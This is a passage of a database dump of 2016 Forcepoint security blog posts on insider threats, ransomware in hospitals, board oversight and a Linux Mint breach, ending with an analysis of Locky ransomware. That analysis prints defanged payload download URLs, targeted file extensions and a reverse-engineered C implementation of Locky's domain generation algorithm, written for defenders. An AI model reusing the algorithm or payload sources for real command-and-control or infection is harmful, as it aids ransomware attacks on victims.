company. In either case, the user has no idea their credentials or computer are being used maliciously.\n	\n\n	Why are insider threats so difficult to address?\n\n\n	Insider threats, like the leaking of huge amounts of data in the Panama Papers breach, originate from inside the company.  Even in today’s day and age, most security budgets are still spent addressing external threats. One of the reasons for this apparent misalignment of budget dollars is the difficulty in recognizing insider threats. It’s much simpler for security teams to detect denial of service attacks from outside the company or malicious network activity coming or going through the company firewalls because they either use incorrect user credentials (repeatedly) or try to access resources outside the company that are known to be malicious or at least suspicious. Insider threats on the other hand, originate from inside the company and use valid user credentials with legitimate access to company data. Identifying the user logging in, and the data being accessed itself would not be an indicator of compromise. To detect an insider threat, organizations need to look deeper into user behavior, not just user access. Monitoring user behavior can be a difficult task, especially without the right tools in place.\n\n\n	We don’t care if most users steal company data.\n\n\n	Often, I see and hear about companies who don’t seem to be concerned with employees taking company data with them. Leadership and the culture either convey the mentality that “we trust our people – they would never steal from the company” or “most employees don’t have access to data that would cause the company material harm if it were exposed.” To them, I ask how confident they are that none of their users have fallen for phishing attacks. Even if the individual doesn’t try to take data with them before they leave the company, someone else may be using their credentials to steal data from the company. For those who feel employees do not have access to data that would cause harm to the company if exposed, maybe they are right?  But depending on their industry, I ask who in their organization can change user passwords; who can take a credit card payment over the phone; and who can access a patient or customer account? The answers can be some of the lowest paid and most transient positions in a company. In short, companies need to be concerned with data theft from inside the company.\n\n\n	How to Monitor User Behavior\n\n\n	Let’s use a fictitious character “Joe” in the software development team as an example. The fact that Joe logs in at 3:00 in the afternoon and accesses the system that manages the source code of an application would not set off any alarms. But if Joe starts copying source code to a removable SD card in his laptop or starts printing large volumes of source code, that should set off alarms. Would your organization recognize if this activity is occurring?\n\n\n	As with many other threats, the best way to defend against insider threats is by using multiple layers of security.  To prevent threats from coming in or leaving the company via email and the web, companies should apply appropriate filtering and sandboxing technologies to evaluate and mitigate those threats. When it comes to user behavior monitoring, there are two effective tools that can be used, and they work best when used together – data loss prevention (DLP) and behavioral analytics. Data loss prevention tools can do a very good job of identifying when sensitive data is attempting to leave the organization – via company email, removable media, printing or uploading to web  or web mail programs or consumer network storage programs like OneDrive and Google Drive. Forcepoint’s data loss prevention tool is even intelligent enough to identify sensitive data in photos and screen capture images. Behavioral analysis tools look at user activity over a period of time and baseline that activity (determine what is “normal”). When a user begins taking actions or performing activities outside of the “normal” baseline activity, alerts are generated and the user is identified as being at a higher level of risk. This could be normal, such as financial analysts working more hours than normal and outside normal business hours at year-end, but it could also be an indicator of potential data theft that has occurred or may occur very soon. When used together, a typical DLP event may not raise a concern, but if the user is also behaving out of the ordinary, this risk will be elevated to a higher level to be investigated.\n\n\n	Over What Period of Time is Information Typically Leaked?\n\n\n	What we don’t know from most insider breaches is over what period of time the data was taken. Did tens of thousands of documents go out daily over the course of a year? Did a million documents a day go out over the course of 2 weeks, or were hundreds of documents stolen every day over the course of several years? Was the source of the breach a malicious insider, a broken business process or an inadvertent insider? Regardless which scenario it was, companies need their DLP and behavioral analytics tools tuned to detect such activity, and should have blocks in place to prevent the removal of sensitive data from both company and non-company devices. In addition, companies need to make sure their security and privacy training is relevant, timely and periodic so that users do not fall prey to phishing and similar attacks and find out they are the inadvertent insider.\n\n\n	Your Breach, Your Failure?\n\n\n	Even the best defended companies and executives can fall victim to insider threats, and they may not even be from your own organization. Like the Ashley Madison breach, the Panama Papers event occurred at a specific company, yet the ramifications were felt around the world by individuals who placed their trust in that company. Not all effects of breaches can be prevented, but government regulators, industry groups and cyber insurance companies are paying close attention to make sure your company isn’t the source of the next breach affecting individuals or companies across the globe. As a positive outcome of the Panama Papers event, expect government regulators from around the globe to push for stronger financial transparency from both individuals and corporations.\n\n\n	Are you doing everything you should to identify and address data loss from within your organization?\n\n\n	References:\n\n\n	1 – Privileged User Abuse & The Insider Threat report conducted by Ponemon Institute May 2014 – commissioned by Raytheon https://www.forcepoint.com/resources/industry-analyst-reports/privileged-user-abuse-insider-threat-ponemon-institute-may-2014\n\n\n	2 - http://www.usatoday.com/story/money/columnist/rieder/2016/04/06/rieder-how-panama-papers-came-together/82703182/\n\n\n	3 - https://www.graphiq.com/wlp/iMdahCukXD7', 'https://www.forcepoint.com/blog/insights/how-important-data-loss-ask-iceland%E2%80%99s-former-prime-minister\n');

We had a lot of great questions concerning learning more about mitigating insider threats aside from simply using DLP. Lastly, reducing complexity is a big deal. We\'ve seen a lot of frustration around point solutions. Teams are just overloaded with security solutions. People are also very excited that we have a unified management with our TRITON solutions.\n\n	\n		Something we were both really excited to see was that people embraced our motto - Forward Without Fear. So many organizations use fear to drive what they are selling, but it is refreshing to hear that a security organization wants to help get people back to business. As with any major conference, there is a sea of grey noise, and many ideas or brands don’t generally stand out.

Instead, they want a partner who does so they can get back to focusing on their business. It\'s very clear after the past couple of days that established and potential customers see the value of the data we have. Our threat intelligence takes time and resources; it\'s not something that can be built today and understood tomorrow. This ties to a pain point we see across the industry: a clear desire to find the right type of person to offer value to an organization when it comes to security. This makes competition between highly skilled individuals very intense. However, most organizations find investing in a solution that buys into a skill set more economically sensible.\n\n\n	We\'ve also seen a trend that the malware market is being disrupted. Currently, the marketplace is saturated with stolen data and therefore the economics don\'t make sense for cyber criminals anymore. As companies increased the barrier to entry on their networks, malware authors and cyber criminals quickly moved to something else. We can see that very explicitly with Locky ransomware. Tomorrow, malware authors may change their attack methods again. Organizations have to be not only agile, but informed with the right threat intelligence to change methods to combat new attacks.\n\n\n	Attendees to the Forcepoint boot have also been asking questions about data aggregation. Many have multiple systems providing different and disparate info which they want to consolidate. They have the systems, but it they\'re still missing the mark. Similarly, with threat intelligence, you can\'t simply start data aggregation today and expect to see the results tomorrow. It takes time.\n\n\n	Data theft technologies are another hot topic. People are starting to recognize that it\'s not always what\'s getting into your network so much how important it is to see the data flowing out. We\'ve seen this across the show floor with vendors focusing on solutions addressing the insider threat.\n\n\n	Lastly, many companies have to consider local rules and regulations, resulting in compliance being another top focus for conference attendees. As the nature of technology business is global, we’re seeing a lot of compliance with an emphasis on \'Think local to be global.\'\n\n\n	Check back tomorrow for a recap of day three!\n\n\n	#ForwardWithoutFear', 'https://www.forcepoint.com/blog/insights/rsa-conference-recap-day-two\n');

The key issues they are facing involve transformative technologies like the Internet of Things and cloud. More than anything, it\'s the amount of data that they have to sift through to get through to what\'s important. This most commonly involves trying to get visibility into activities on their network and around their data: Who\'s using what and why; where is it going; how is it getting there. This is very consistent with what we\'re seeing in the vendor space as well.\n\n\n	Another key theme that resonates here at RSA is around cyber insurance. Josh Douglas and I will be speaking today around what we believe the future holds for cyber insurance. As all of us are aware, it\'s a very immature market and it is very difficult to ensure that premiums are reasonable. With car insurance, insurance companies ask questions about age, education, and driving record, etc. and mapping all of this information calculate a premium. What we don\'t have for cyber insurance is a clear methodology to develop premiums for organizations while at the same time ensuring they have the right protection. We\'ll cover how the industry is changing, what that will mean for the CISO community and how organizations can acquire the right cyber insurance for their needs.\n\n\n	To hear more, join Forcepoint CISO David Barton and CTO Joshua Douglas today Wednesday, March 2, in Moscone North Hall, conference Room 133 at 11:30 am where they will discuss the topic “Assessing Risk: CSOs and Cyber Insurance.”  This presentation will address one of the most important challenges facing enterprises and industries: how to weigh the pros and cons of insuring against the potential fallout of a cyber-disaster.', 'https://www.forcepoint.com/blog/insights/rsa-conference-recap-day-one\n');

In a recent string of attacks (see Hollywood Presbyterian and Flint Hurley Medical Center) ransomware has become an increasing threat to healthcare providers, but little has been said about how it could impact patient safety. Ransomware infects a PC and restricts access to the infected PC, typically by encrypting most files.  In the case of Locky, which was in the media recently, it will also reach out and try to establish connections to network shares and encrypt that information as well. When the ability to use PCs is significantly hindered – largely making them inoperable – caregivers in hospitals may be forced back to paper-based workflows. In today’s day and age, this causes a significant disruption to normal operations.\n\n\n	Why ransomware?  \n\n\n	Ransomware has become an easier source of revenue for cyber criminals.  With a successful attack against an organization, the organization finds itself in a crippled position from an information availability perspective. The data it needs to function is no longer available and the organization left with a risk management decision: does it bow to the demands of the criminal, or try to recover itself, not knowing if it can or how long it will take? Although most would agree that bowing to the demands of a criminal is morally and ethically a bad decision, C-level leaders have to make the decision that is in the best interest of organization. Consistent with many others, Hollywood Presbyterian Medical Center chose to pay the $17,000 fee for a potentially quicker recovery, and assumed the risk that the criminal would provide the encryption key and won’t try the same threat again.  Given the potentially significant impact to hospital operations, many healthcare executives might make the same call.\n\n\n	Potential Impact of Ransomware\n\n\n	When threat impacts are discussed in the healthcare industry, the conversation is usually quick to steer to medical devices, a top concern today.  What’s the potential impact to hospitals from ransomware attacks? Information is time-critical at hospitals, especially in the emergency rooms and operating rooms.  If PCs stop functioning and there are delays in information access and information flow, it could cause substantial disruption, and could even cause patient safety concerns.\n\n\n	What impact could going back to paper charts have on human life and safety?  Many in the field might say “that’s no big deal – our caregivers know how to fallback to paper processes.” However, organizations need to ask themselves whether that’s still true in 2016.  New qualified physicians and nurses train on electronic medical record systems. Unless organizations are training staff how to operate when the system is down, they are not going to know how to perform via paper.\n\n\n	Let’s consider caregivers trying to treat patients, and consider the difficulties they would encounter if their PCs were not functional, rendering no access to the electronic medical record system.\n\n\n		Patient medical history inaccessible. Caregivers must learn that from the patient or family members, and if the patient is unconscious, family is not present, or they do not speak the same language, that can cause significant delays in treatment.\n	\n		Patient medication history unavailable.  To treat a patient effectively, a physician needs to know what medications the patient takes on a regular basis, and what medications have been administered to this patient in the last 24-48 hours. If prescribed the wrong medication or incorrect dosage, there could be serious risk of harm to the patient.\n	\n		Lab orders delayed.  Now orders need to be delivered on paper or over the phone. If 50 people are trying to place orders concurrently, how long will it take to place the order?\n	\n		Lab results stalled.  Lab orders are typically transmitted electronically..  If that communication link is broken, how long it will take to get the lab result to the caregiver?\n	\n		Prescriptions postponed because they cannot be ordered electronically\n	\n		Medical devices inoperable. Some medical devices rely on PCs to manage the device.  If that PC becomes inoperable, critical MRI or interpretation of radiologic data may not happen.\n	\n		Monitoring PCs impacted. Medical devices that feed data to a central nursing station may no longer be able to because the monitoring station isn’t functional.  The hospital may not have adequate staff to physically visit all rooms to monitor the patients.\n	\n		Potential public relations controversy – Imagine a family coming to the hospital to visit a family member after a major surgery and the hospital cannot tell the family what room they are in because the staff at the desk can no longer access the application that tracks location of patients. What if that patient passes before the family can see them?\n\n	Prevention\n\n\n	What can organizations to do protect themselves from ransomware?\n\n\n		Put strong technologies in place to prevent and detect threats.  Email security, web security and endpoint security technologies need to be able to identify these threats so that the threat has no ability to penetrate the organization.  Because no technology is perfect and the threats can be so tricky for users to identify, you need to focus on\n	\n		Educate the workforce.  Ransomware is typically spread via infected email attachments or links.  Staff need to understand threats of this type and resist the need to click that link, or launch that file to see what it is.  Repetition of security education is key.\n	\n		Make sure IT, security and other staff or partners are trained in prevention, detection and incident response. Without trained staff, an organization’s ability to detect and respond threats is severely limited and could cause significant downtime and expense.\n\n	Bottom line: have contingency plans. In the age of ransomware, every organization needs to ponder the cost of investing in cybersecurity and education versus the cost of using pens and paper.', 'https://www.forcepoint.com/blog/insights/potential-effects-ransomware-healthcare\n');

This disconnect is particularly glaring at the board of directors (BOD) level. According to PwC though 61 percent of CEOs are concerned about cybersecurity, less than half of board members actually request information about their organization’s state of cyber-readiness.[1]\n\n\n	Though cybersecurity risk directly affects an organization’s future success, which remains the primary responsibility of any board of directors, it remains overlooked at the board level. Often seen as a technological problem, not a risk management issue, boards often fail to require regular review and oversight of their organizations’ security posture. While data breaches may result from technological weaknesses in part, a lack of employee awareness around risky online behaviors or cyber crisis management plan, among other factors, can be any organization’s undoing.\n\n\n	The IT department can no longer be expected to solve the problem of cybersecurity alone. It is essential that BODs ask strategic and thoughtful questions on how well the organizations they oversee are able to handle cybersecurity related issues and planning.\n\n\n	Below are several questions all board members should be asking:\n\n\n		What is the organization’s most critical data, where is it stored, used and shared and what are the consequences of it being lost?\n	\n		What are the top cybersecurity risks when adopting new technology such as cloud computing and mobile?\n	\n		How are employees being educated to raise awareness of threats and risky behavior?\n	\n		How are existing defenses tested and what were the results of these previous risk assessments?\n	\n		How are cybersecurity governance and legal frameworks managed for the territories in which the organization operates and from which data is collected?\n	\n		In the event of a breach, what protocols and procedures (communications and crisis plans) have been developed or tested?\n	\n		Has the risk of attack and its potential data loss been measured across the organization’s chain of partners, suppliers and customers?\n	\n		When was the organization’s last breach and what lessons were learned as a result?\n\n	 \n\n\n	Cybersecurity is a risk management issue, not a technological one. A data breach can expose an organization to a myriad of liabilities including business disruption, civil, criminal and regulatory penalties, litigation and permanent reputational damage. In today’s cyber climate, board members should take the opportunity to receive, review and update the organization’s security posture at every meeting.\n\n\n	For more information, read the Forcepoint white paper What Every Board of Directors Should Know about Managing Risk in their Organization.\n\n\n	 \n\n\n	\n		\n			[1] PwC Global Economic Crime Survey 2016, 16', 'https://www.forcepoint.com/blog/insights/bod-mia-cybersecurity\n');

We also reverse engineered the new DGA here in Forcepoint security labs.  We have now decided to publish this new DGA, which is more robust and less deterministic. Because of the changes we have observed, we believe that is is highly likely that the Locky developers will not change this algorithm again for the foreseeable future.\n\n\n	Forcepoint are actively collaborating with trusted industry partners and government agencies on sharing information regarding Locky.\n\n\n	Seeded DGA\n\n\n	We have reverse engineered and re-implemented the new algorithm which can be seen below. The DGA now relies upon a hard-coded seed in the malware\'s base configuration. This seed can be changed at any time by the author or operator. For the sample we analyzed on February 24 (SHA1 e8ea52e0d43f9420a65993a4123fc15d64bc880e) this seed had the value of 7. However, for the sample we analyzed on February 25 (SHA1 2ddd654437a48974f241f81a9d645a7374b82bec) this seed had the value of 9.\n\n\n	The Locky developers and/or operators can change this seed every day if they wish, and of course can register the domains in advance. The authors knew that their original DGA had a limited time-span when the seed was deterministic, as vendors could preemptively block and sinkhole future domains.

The seed value cannot be known until a physical sample is seen, at which point it may be too late to block the traffic solely based on the domains  This is an illustration, if one were needed, that it is important not to rely solely on blocking the DGA domains.  Especially because they may not even be used if the malware is able to contact its hard-coded command-and-control servers.\n\n\n	Forcepoint will continue to monitor Locky closely.  We will also continue to collaborate and share information with our trusted industry partners and government agencies.\n\n\n	Contributors: Nick Griffin, Andy Settle', 'https://www.forcepoint.com/blog/security-labs/lockys-new-dga-seeding-new-domains-russia-update-26feb16\n');

For government and business organizations alike, software and hardware provide the technological foundation for executing on operations.  A Chief Information Security Officer (CISO) ensures that foundation is strong enough to support day-to-day needs and potential stressors as they evolve. Acknowledging this, the current administration has set aside billions of dollars to modernize legacy software and equipment and appoint a CISO to oversee its implementation. However, when it comes to overhauling technology, most organizations find both funds and personnel limited. Minus unlimited reserves, how can business keep up?\n\n\n	First, identify the most high value and at-risk assets and data, and then determine the IT resources that support them and require immediate improvements to remain effective.  Focusing on the relationship between specific assets and data architecture can help keep with budgets and scalability. To ensure that technological counter measure purchases positively affect security posture, align business, compliance and third party requirements to a model such as the NIST cyber sec framework.\n\n\n	In addition to government wide technological updates, CNAP also creates a delegation of thought leaders in a wide range of fields to provide insight and counsel on national cyber security issues (the Commission on Enhancing National Cybersecurity). Businesses striving to mirror this should seek to appoint members with an understanding of IT security issues to their board, able to communicate and understand the both symbiotic relationship between business and cyber security and its potential impacts.\n\n\n	While many of CNAP’s proposals are more long range and ambitious, including millions of dollars directed at grants and scholarships to close the cyber security gap, others are commonsensical and those any organizations would do well to consider. These include requiring two-factor authentication account log-ins and having a plan in place for evaluating cyber incidents and coordinating a response.\n\n\n	CNAP ‘s mission is massive in scale and monetary requirements, but no matter the size or industry, comprehensive cybersecurity requires that businesses account for and invest in people, processes, and technology.', 'https://www.forcepoint.com/blog/insights/what-business-can-take-away-cybersecurity-national-action-plan\n');

Ubuntu releases their own security advisories and CVEs, no such advisories are released by Mint Linux.  Due to this reason no security issues could be found specifically for Mint Linux. However, any security issue found on Ubuntu would be applicable downstream to Mint distribution as well.  Only one CVE has been logged against the Mint distribution (SEE: http://www.cvedetails.com/cve/CVE-2014-1949/).  This was a vulnerability identified in 2014 and was a vulnerability in Ubuntu that was also identified in Mint. \n\n\n	Likely Motivations Behind the Breach\n\n\n	According to an interview with \'Peace\' by a ZDNet reporter, \"The hacker said their prime motivation for the backdoor was to build a botnet.\"  But the same report also mentioned that \"Peace also claimed to have stolen an entire copy of the site\'s forum twice -- one from January 28, and most recently February 18, two days before the hack was confirmed.\"  The same ZDNet report also says that the data dump of over 71,000 forum users with personally identifiable information has been put on sale in DarkNet for 0.197 BitCoins (~$85) and that ZDNet have been able to verify it.  The selling of the data dump points to an immediate financial and the botnet claim points to future malicious plans (SEE: http://www.zdnet.com/article/hacker-hundreds-were-tricked-into-installing-linux-mint-backdoor/).\n\n\n	Known-Good ISO Checksums\n\n\n	Mint Linux website has been taken offline. The published a set of MD5 signatures for the legitimate versions of Linux Mint ISOs: \n\n\n6e7f7e03500747c6c3bfece2c9c8394f  linuxmint-17.3-cinnamon-32bit.iso\ne71a2aad8b58605e906dbea444dc4983  linuxmint-17.3-cinnamon-64bit.iso\n30fef1aa1134c5f3778c77c4417f7238  linuxmint-17.3-cinnamon-nocodecs-32bit.iso\n3406350a87c201cdca0927b1bc7c2ccd  linuxmint-17.3-cinnamon-nocodecs-64bit.iso\ndf38af96e99726bb0a1ef3e5cd47563d  linuxmint-17.3-cinnamon-oem-64bit.iso\n\n\n	Threats\n\n\n		The intruder(s) downloaded the forum data containing hashed passwords, email addresses and dates of birth for over  71,000 Linux Mint forums members.  This data was put for sale in the DarkNet for 0.197 BitCoin or about 85$ US per download.\n	\n		Anyone who had an user account on Linux Mint forum be aware that their username/password pair has been compromised.\n	\n		Anyone who downloaded and installed from one of the Linux Mint installers on 20th February might have become part of a botnet.\n\n	Mitigations\n\n\n		If a suspect compromised ISO has been used to install Linux Mint the system should be considered for forensic investigation in order to ascertain if it has been compromised itself.  When in doubt, rebuild from a trusted and verified ISO.\n	\n		In organisations where users are allowed to bring or build their own workstation then auditing any exsiting Mint Linux desktop should be considered.\n\n	Observations\n\n\n	File Signature Verification\n\n\n	On the user side, the generally recommended mitigation again rogue installers is to check the file hash / signature values (MD-5 or SHA-1, SHA-256 etc). But since the intruder had access to the official site itself, he/she was not only able to upload modified ISO files but also was able to modify the hash values for the ISO files and thereby rendering the hash value check useless. This means that users not only need to check hash values of any software installers they download but they also need to check the source of those hash values. Fortunately, the hash values of official versions are found in more than locations and users should attempt to make sure that there no discrepancies between hash values found in different places.  The Mint Linux site has now posted a blog listing the valid signatures for the Linux Mint 17.3 Cinnamon ISOs.\n\n\n	Verifying Already Installed System(s)\n\n\n	If someone already has a system running and is not sure about the integrity of the installer used, it\'s strongly recommended that a complete fresh re-installation from a verified installer is performed (including a full re-format of the drives).\n\n\n	Is Bleeding-Edge Always the Best?\n\n\n	Since Ubuntu and some of its derivatives (including Mint) support the concept of \'Personal Package Archive\' (PPA).  PPA allows anyone to start his/her own \'personal\' repository and host software packages for others to download. Canonical (the company behind Ubutnu) categorically states that \"PPAs are not monitored or checked\" and therefore users are left to decide whether or not to trust a package available via a PPA. This makes PPAs a potential vector for malware.\n\n\n	Benefits of Local Mirroring\n\n\n	Local mirroring is usually used by business and educational organisations and not by home/small business users. Local mirroring might not provide any benefit at all for Home/small businesses since number of systems involved are likely to be few in number and overheads are too great. For medium to big enterprises using large number of installations, there may be an advantage in running a local mirror.  In that case, the system admin could manually check and verify the installers/packages before downloading them to his mirror site and thereby providing an extra layer of security checks.\n\n\n	Organisation Allowing Employees Build their Own Desktop\n\n\n	In this case, the organisation would effectively be offering a big attack surface to any malicious actor willing to contemplate a similar breach of any Linux distribution site/mirror site. A trade-off could be achieved by the organisation by hosting its own local mirror (hosting installers verified by the system admins) and only allowing Linux distros from the local mirror to be used within the organisation\'s network.\n\n\n	Home Users\n\n\n	Home users can take precaution when downloading any installers (OS or application) and check the signatures of the downloaded file and if possible from more than one source to verify validity. It\'s also highly recommended to use only official repositories form Linux software update (apt or yum) and not use Personal Package Archives unless completely certain about their legitimacy.\n\n\n	Customer Protection\n\n\n	Forecepoint customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\n\n		Stage 5 (Dropper File) - The backdoored Linux Mint ISOs are detected.\n	\n		Stage 6 (Backchannel Traffic) - Attempts by the Tsunami backdoor to contact its command-and-control server are blocked.\n\n	Forcepoint customers are protected against this threat via Forcepoint Threat Protection for Linux at the following stages of attack:\n\n\n		Stage 5 (Dropper File) - Backdoor code detected in memory.\n\n	REFERENCES\n\n\n		Tampered Linux Mint ISO Linked on Official Website / http://www.hotforsecurity.com/blog/tampered-linux-mint-iso-linked-on-official-website-13433.html\n	\n		Hacker explains how he put \"backdoor\" in hundreds of Linux Mint downloads / http://www.zdnet.com/article/hacker-hundreds-were-tricked-into-installing-linux-mint-backdoor/\n	\n		Beware of hacked ISOs if you downloaded Linux Mint on February 20th! / Written by Clem on Sunday, February 21st, 2016 @ 1:44 am / http://blog.linuxmint.com/?cat=1\n	\n		All forums users should change their passwords / http://blog.linuxmint.com/?p=3001\n	\n		Ubuntu Security Notices / http://www.ubuntu.com/usn/utopic/\n	\n		Ubuntu CVE Tracker / http://people.canonical.com/~ubuntu-security/cve/main.html\n	\n		Linux Mint hack: 71,000 user accounts stolen and malware planted using Tsunami backdoor / http://www.ibtimes.co.uk/linux-mint-hack-malware-planted-in-17-3-cinnamon-iso-and-71000-user-accounts-stolen-with-tsunami-backdoor-1545254\n	\n		Linux Mint hacked: Malware-infected ISOs linked from official site / http://www.theregister.co.uk/2016/02/21/linux_mint_hacked_malwareinfected_isos_linked_from_official_site/\n	\n		IRC based distributed denial of service client  (Tsunami / Kaiten ) / https://dl.packetstormsecurity.net/irc/kaiten.c\n	\n		How to use PPAs to install bleeding-edge software in Ubuntu and Linux Mint / http://www.pcworld.com/article/2942171/how-to-use-ppas-to-install-bleeding-edge-software-in-ubuntu-and-linux-mint.html\n	\n		man.cy from malicious Linux Mint ISO / https://gist.github.com/Oweoqi/31239851e5b84dbba894\n	\n		Beware of Backdoored Linux Mint ISOs / https://securelist.com/blog/incidents/73893/beware-of-backdoored-linux-mint-isos/\n\n	Blog contributors: Dey, Bappaditaya, Griffin, Nicholas, Settle, Andrew', 'https://www.forcepoint.com/blog/security-labs/linux-mint-website-breach-leads-trojanised-download-and-loss-personal-data\n');
INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (186, 'Locky Ransomware - Encrypts Documents, Databases, Code, BitCoin Wallets and More...', 'Nicholas GriffinJohn BergbomForcepoint Security La', '\n      \n    \n      \n      \n   ', 'A new ransomware named Locky has emerged recently.  Locky is distributed in a manner similar to that of Dridex botnets 120 and 220. This new ransomware uses 128-bit AES encryption and has a domain generation algorithm (DGA). It is also capable of encrypting SQL databases, source code, BitCoin wallets and more.\n\n\n	UPDATE: Please see our updated  blog post:  LOCKY\'S NEW DGA - SEEDING THE NEW DOMAINS [RUSSIA UPDATE: 26/FEB/16] where we detail the new DGA and the Locky base configuration.\n\n\n	E-mail Lures\n\n\n	The e-mail lures used in Locky campaigns are similar in their nature and targeting to Dridex botnets 120 and 220. It appears likely that the same actors behind those botnets are distributing the new Locky ransomware.\n\n\n	\n\n\n	As usual, the DOC file attachment contains a malicious macro that will download and execute the malware payload. The lure shown above has similar characteristics to a Dridex botnet 120 e-mail campaign, and the documents used in this campaign attempted to download a Locky payload from one of the following URLs:\n\n\nhxxp://onigirigohan.web.fc2[.]com/1/1.exe\nhxxp://killerjeff.free[.]fr/2/2.exe\nhxxp://uponor.otistores[.]com/3/3.exe\nhxxp://premium34.tmweb[.]ru/4/4.exe\nhxxp://bebikiask.bc00[.]info/5/5.exe\nhxxp://test.rinzo[.]biz/6/6.exe\nhxxp://avp-mech[.]ru/7/7.exe\n\n\n	The payload executable is typically packed and obfuscated to evade anti-virus detection.\n\n\n	File Encryption\n\n\n	Locky will seek to encrypt any files that it can find, except for core Windows operating system files. The list of files and extensions it targets is as follows:\n\n\n.m4u .m3u .mid .wma .flv .3g2 .mkv .3gp .mp4 .mov \n.avi .asf .mpeg .vob .mpg .wmv .fla .swf .wav .mp3 \n.qcow2 .vdi .vmdk .vmx .gpg .aes .ARC .PAQ .tar.bz2 \n.tbk .bak .tar .tgz .gz .7z .rar .zip .djv .djvu .svg \n.bmp .png .gif .raw .cgm .jpeg .jpg .tif .tiff .NEF \n.psd .cmd .bat .sh .class .jar .java .rb .asp .cs .brd \n.sch .dch .dip .pl .vbs .vb .js .h .asm .pas .cpp .c \n.php .ldf .mdf .ibd .MYI .MYD .frm .odb .dbf .db .mdb \n.sql .SQLITEDB .SQLITE3 .asc .lay6 .lay .ms11 (Securitycopy) \n.ms11 .sldm .sldx .ppsm .ppsx .ppam .docb .mml .sxm .otg \n.odg .uop .potx .potm .pptx .pptm .std .sxd .pot .pps \n.sti .sxi .otp .odp .wb2 .123 .wks .wk1 .xltx .xltm \n.xlsx .xlsm .xlsb .slk .xlw .xlt .xlm .xlc .dif .stc \n.sxc .ots .ods .hwp .602 .dotm .dotx .docm .docx .DOT \n.3dm .max .3ds .xml .txt .CSV .uot .RTF .pdf .XLS .PPT \n.stw .sxw .ott .odt .DOC .pem .p12 .csr .crt .key wallet.dat\n\n\n	Each file is encrypted using Microsoft Windows\' own CryptoAPI with 128-bit AES in cipher block chaining mode. The file is then renamed with a \".locky\" extension.\n\n\n	Network Shares. Locky will also encrypt any files found on network shares, even ones that are not locally mapped on the current machine.\n\n\n	Domain Generation Algorithm\n\n\n	Locky typically comes with at least one hard-coded command-and-control (C&C) IP address that it uses for its encryption key exchange and reporting infection. However, Locky also uses a DGA as part of its command-and-control (C&C) infrastructure. Forcepoint Security Labs reverse engineered and re-compiled the algorithm. Here is the DGA in C:\n\n\n/* Modify the SystemTime to generate domains for a different day */\n \nchar *LockyDGA(unsigned int seed, SYSTEMTIME SystemTime)\n{\n	int modConst1 = 0xB11924E1;\n	int modConst2 = 0x27100001;\n	int modConst3 = 0x2709A354;\n	int modYear, modMonth, modDay;\n	int modBase = 0, i = 0, genLength = 0;\n	unsigned int x = 0, y = 0, z = 0;\n	unsigned int modFinal = 0;\n	char *domain;\n	char tldchars[29] = \"rupweuinytpmusfrdeitbeuknltf\";\n  \n	// Perform some shifts with the constants\n	modYear = __ROR4__(modConst1 * (SystemTime.wYear + 0x1BF5), 5);\n	modDay = __ROR4__(modConst1 * (modYear + ((unsigned int)SystemTime.wDay >> 1) + modConst2), 5);\n	modMonth = __ROR4__(modConst1 * (modDay + SystemTime.wMonth + modConst3), 5);\n	modBase = __ROL4__(seed % 6, 21);\n	modFinal = __ROR4__(modConst1 * (modMonth + modBase + modConst2), 5);\n	modFinal += 0x27100001;\n  \n	// Length without TLD\n	genLength = modFinal % 11 + 5;\n  \n	if (genLength)\n	{\n		// Allocate full length including TLD and null terminator\n		domain = (char *)malloc(modFinal % 11 + 8 + 1);\n  \n		// Generate domain string before TLD\n		do\n		{\n			x = __ROL4__(modFinal, i);\n			y = __ROR4__(modConst1 * x, 5);\n			z = y + modConst2;\n			modFinal = z;\n			domain[i++] = z % 25 + 97;\n		}\n		while (i < genLength);\n \n		// Add a \'.\' before the TLD\n		domain[i] = \'.\';\n \n		// Generate the TLD from a hard-coded key-string of characters\n		x = __ROR4__(modConst1 * modFinal, 5);\n		y = (x + modConst2) % ( (sizeof(tldchars) - 1) / 2 );\n \n		domain[i + 1] = tldchars[2 * y];\n		domain[i + 2] = tldchars[2 * y + 1];\n		domain[i + 3] = 0; // Null-terminate\n	}\n	return domain;\n}\n\n\n	 \n\n\n	The algorithm generates six domains per day, which looked like:\n\n\n2016-02-18: wblejsfob[.]pw, kqlxtqptsmys[.]in, cgavqeodnop[.]it, pvwinlrmwvccuo[.]eu, dltvwp[.]it, uxvvm[.]us\n\n2016-02-19: wblejsfob[.]pw, kqlxtqptsmys[.]in, cgavqeodnop[.]it, pvwinlrmwvccuo[.]eu, dltvwp[.]it, uxvvm[.]us\n\n2016-02-20: nquvsq[.]pm, bgrjlkvxa[.]fr, svkjhguk[.]ru, gitybdjgbxd[.]nl, xxmavhnxts[.]tf, ovdeondpeethj[.]eu\n\n\n	A full list of the domains used from February 1-29 is available at the end of this blog entry.\n\n\n	 \n\n\n	The C&C communication looks as follows:\n\n\n	\n\n\n	Ransom Message & Payment\n\n\n	Once Locky has encrypted all of the files it can find, it will display a ransom message to the user.  This is done by changing the current wallpaper and showing an image and text file such as the one below:\n\n\n	\n\n\n	Browsing to the payment page reveals a smart looking payment lure, requesting a payment of 0.5 BTC which is currently approximately $210 U.S. Dollars.\n\n\n	\n\n\n	Browsing to this page results in a unique BitCoin wallet being created, as documented by Hewlett Packard researchers. Once payment has been made, Locky will generate a decrypter utility on the fly with the necessary decryption key which can then be downloaded.\n\n\n	Customer Protection\n\n\n	Forecepoint customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\n\n		Stage 2 (Lure) - The e-mail lures associated with Locky are detected and blocked\n	\n		Stage 5 (Dropper File) - The Locky ransomware payloads are detected and blocked\n	\n		Stage 6 (Backchannel Traffic) - Attempts by Locky to communicate with its command-and-control servers are blocked in real-time\n\n	In addition, the Forcepoint file sandbox detects Locky\'s behavior as malicious:\n\n\n	\n\n\n	Observations\n\n\n	Crypto ransomware shows no signs of going away, with new strains showing up on a weekly basis.\n\n\n	To protect yourself against threats such as these then strong and enforced policies are key.  All of the observations below should be no surprise and should be essentials in any business, backed up by continuous review, training and awareness for all those concerned:\n\n\n		Consider having regular and external back-ups and archives of your critical data.\n	\n		Do not open e-mails attachments unless you can verify and trust the sender.\n	\n		Microsoft Office macros should be disabled by default, and only enabled if absolutely needed.\n	\n		Network segregation is key, especially for critical business systems; in order to minimize any potential damage to the business as a whole.\n\n	Indicators of Compromise (IOCs)\n\n\n	Locky executable SHA1

